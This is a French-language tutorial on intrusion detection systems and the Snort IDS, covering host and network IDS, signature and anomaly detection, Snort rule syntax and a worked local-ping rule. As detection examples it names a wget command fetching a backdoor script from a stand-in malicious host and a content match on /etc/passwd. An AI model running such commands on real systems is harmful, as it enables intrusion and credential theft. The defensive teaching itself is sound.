# IDS


## 🔍 **1. Qu’est-ce qu’un IDS ?**

Un **Intrusion Detection System (IDS)** est un **système de sécurité passif** dont la mission est de **surveiller le trafic réseau ou les activités système** afin de **détecter des comportements malveillants ou anormaux**, **après** que le trafic ait franchi les défenses périmétriques comme un pare-feu.

> 📌 **Clé conceptuelle** :  
> Le pare-feu **filtre** (autorise/refuse).  
> L’IDS **observe et alerte** — il **n’intervient pas**.

### 🔒 Analogie physique (bâtiment sécurisé)
- **Pare-feu** = gardien à l’entrée : vérifie les identités, refuse les intrus évidents.
- **IDS** = caméras de surveillance + capteurs de mouvement à l’intérieur : détectent les comportements suspects **même si la personne est entrée légitimement**.

> ⚠️ Si un attaquant contourne le pare-feu (ex. via une requête HTTP légitime mais contenant un payload SQLi), **seul l’IDS peut le repérer à l’intérieur du réseau**.

---

## 🧩 **2. Pourquoi un IDS est indispensable ?**

Les pare-feux ne suffisent pas :
- Ils opèrent au niveau **connexion** (L3/L4) ou parfois application (L7), mais **ne comprennent pas le contenu sémantique** du trafic.
- Un attaquant peut utiliser des canaux **légitimes** (HTTP, DNS, SSH) pour exfiltrer des données ou exécuter des commandes.
- Les menaces internes (insiders, malware déjà installé) sont **invisibles au pare-feu**.

👉 L’IDS comble ce vide en analysant **le contenu réel** du trafic ou des logs système **en profondeur**.

---

## 🗂️ **3. Typologie des IDS : deux axes de classification**

### A. **Par mode de déploiement**

| Type | Description | Avantages | Inconvénients |
|------|-------------|----------|---------------|
| **HIDS**<br>(Host-based IDS) | Installé **directement sur un hôte** (serveur, poste). Analyse les logs système, les processus, les fichiers, les appels système. | Vue **fine-grainée** : détection de rootkits, modifications de fichiers critiques, accès non autorisés. | Coûteux à gérer à grande échelle. Consomme des ressources locales. |
| **NIDS**<br>(Network-based IDS) | Déployé **au niveau du réseau** (souvent en mirroring de port ou TAP). Analyse tout le trafic traversant un segment. | Vue **globale** du réseau. Centralisé. Détecte les scans, exploits, C2, etc. | Moins précis sur les activités internes à un hôte. Peut être aveuglé par le chiffrement (TLS). |

> ✅ **Dans un environnement professionnel** : combinaison HIDS + NIDS = **défense en profondeur**.

---

### B. **Par méthode de détection**

| Méthode | Principe | Capacités | Limites |
|--------|--------|----------|--------|
| **Signature-based** | Compare le trafic à une **base de règles prédéfinies** (signatures d’attaques connues). | Très efficace contre les **menaces connues** (ex. CVE exploités). Faible taux de faux positifs. | **Inutile contre les zero-days**. Base de signatures doit être constamment mise à jour. |
| **Anomaly-based** | Établit une **baseline** du comportement "normal", puis détecte les **écarts statistiques**. | Peut détecter **des attaques inconnues** (zero-days, APTs). | **Taux élevé de faux positifs**. Nécessite un apprentissage long et un tuning fin. |
| **Hybrid** | Combine les deux approches. | Meilleur équilibre entre couverture et précision. | Plus complexe à configurer et maintenir. |

> 💡 **Exemple concret** :  
> - Signature : règle Snort détectant `wget http://malicious.site/backdoor.sh`  
> - Anomaly : détection d’un pic soudain de trafic sortant vers une IP jamais vue → possible exfiltration.

---

## 🛠️ **4. Snort : l’IDS open-source de référence**

### 🔹 Historique & positionnement
- Créé en 1998 par Martin Roesch.
- Devenu la **norme de facto** des IDS open-source.
- Maintenu aujourd’hui par Cisco (via Sourcefire).
- Utilisable aussi en **IPS** (Intrusion Prevention System) avec configuration appropriée.

### 🔹 Architecture clé
- **Fichier de config principal** : `/etc/snort/snort.conf`
  - Définit `$HOME_NET`, interfaces, règles activées, seuils, etc.
- **Répertoire des règles** : `/etc/snort/rules/`
  - Fichiers `.rules` contenant des milliers de signatures.
  - Fichier `local.rules` pour vos règles personnalisées.

---

## ⚙️ **5. Modes d’exécution de Snort**

| Mode | Commande type | Usage |
|------|---------------|-------|
| **Packet Sniffer** | `snort -v` | Affiche les paquets en temps réel (debug réseau). |
| **Packet Logger** | `snort -l ./log` | Enregistre tout le trafic au format PCAP pour analyse forensique. |
| **NIDS (mode IDS)** | `snort -c snort.conf -i eth0` | **Mode principal** : applique les règles et génère des alertes. |

> ✅ **Pour un pentester** : le mode NIDS est essentiel pour simuler un SOC ou analyser son propre trafic pendant un test.

---

## 📜 **6. Syntaxe des règles Snort : structure puissante**

Une règle Snort suit ce schéma :

```snort
action protocol src_ip src_port direction dst_ip dst_port (options)
```

### Exemple détaillé :
```snort
alert icmp any any -> $HOME_NET any (msg:"Ping Detected"; sid:10001; rev:1;)
```

| Composant | Valeur | Signification |
|----------|--------|---------------|
| `action` | `alert` | Génère une alerte (autres : `log`, `pass`, `drop` en IPS) |
| `protocol` | `icmp` | Protocole ciblé |
| `src_ip` / `src_port` | `any any` | Source quelconque |
| `direction` | `->` | Flux unidirectionnel |
| `dst_ip` | `$HOME_NET` | Variable définie dans `snort.conf` (votre réseau protégé) |
| `options` | `(msg:...; sid:...; rev:...)` | Métadonnées critiques |

### Options importantes :
- `msg` : message lisible pour l’analyste.
- `sid` (**Signature ID**) : identifiant unique. Plage réservée :
  - `< 1,000,000` : règles communautaires
  - `≥ 1,000,000` : règles **personnelles** (à utiliser dans `local.rules`)
- `rev` : numéro de révision (utile pour le versioning).
- `content` : chaîne à matcher dans le payload (ex. `content:"/etc/passwd";`).
- `flags`, `ttl`, `window` : pour affiner la détection réseau.

---

## 🧪 **7. Création & test d’une règle personnalisée (cas pratique)**

### Objectif : détecter un ping local (ICMP echo request vers 127.0.0.1)

1. **Éditer** `/etc/snort/rules/local.rules` :
   ```snort
   alert icmp any any -> 127.0.0.1 any (msg:"Loopback Ping Detected"; sid:1000001; rev:1;)
   ```

2. **Lancer Snort en mode NIDS sur l’interface loopback (`lo`)** :
   ```bash
   sudo snort -q -A console -c /etc/snort/snort.conf -i lo
   ```
    - `-q` : mode silencieux (--quiet)
    - `-A console` : affichage des alertes sur la console
    - `-c /etc/snort/snort.conf` : fichier de configuration
    - `-i lo` : interface loopback

3. **Déclencher l’événement** :
   ```bash
   ping 127.0.0.1
   ```

4. **Résultat attendu** :
   ```
   [**] [1:1000001:1] Loopback Ping Detected [**] {ICMP} 127.0.0.1 -> 127.0.0.1
   ```

✅ **Preuve que votre règle fonctionne**.

---

## 📁 **8. Analyse forensique avec PCAP**

Snort peut analyser du trafic **historique** (fichier `.pcap`) :

```bash
sudo snort -r capture.pcap -c /etc/snort/snort.conf -A console
```

> 🔎 **Cas d’usage pentest** :  
> Vous avez capturé du trafic pendant un CTF ou un test. Vous soupçonnez une backdoor.  
> → Relancez Snort dessus avec des règles ciblées (ex. détection de reverse shell, DNS tunneling).

---

## 🧠 **9. IDS vs IPS : ne pas confondre !**

| IDS | IPS |
|-----|-----|
| **Passif** : observe, alerte. | **Actif** : observe, **bloque**. |
| Déployé en **écoute seule** (SPAN/mirror). | Placé **en ligne** (comme un pare-feu). |
| Aucun impact sur la latence. | Peut causer des coupures si mal configuré. |
| Idéal pour **monitoring/détection**. | Idéal pour **prévention automatique**. |

> ⚠️ Snort peut faire les deux, mais **par défaut, c’est un IDS**.

---

## ✅ **Conclusion : l’IDS, œil vigilant du réseau**

L’IDS n’est **pas une solution magique**, mais un **élément critique** de la chaîne de sécurité :
- Il transforme le réseau d’un espace opaque en un **environnement observable**.
- Il permet une **réponse rapide** aux incidents (grâce aux alertes).
- Il fournit des **preuves numériques** pour l’analyse post-attaque.

